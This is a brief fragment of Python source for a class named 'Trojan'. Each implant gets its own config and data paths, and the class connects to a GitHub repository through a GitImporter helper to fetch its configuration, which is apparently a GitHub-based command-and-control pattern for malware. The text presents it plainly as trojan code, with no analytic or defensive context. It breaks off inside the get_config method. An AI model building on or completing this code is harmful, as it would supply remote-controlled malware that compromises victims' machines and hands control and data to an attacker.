...
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'config/{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = GitImporter.github_connect()

    def get_config(self):
        config_json = GitImporter.get_file_contents('config', self.config_file, self.repo)
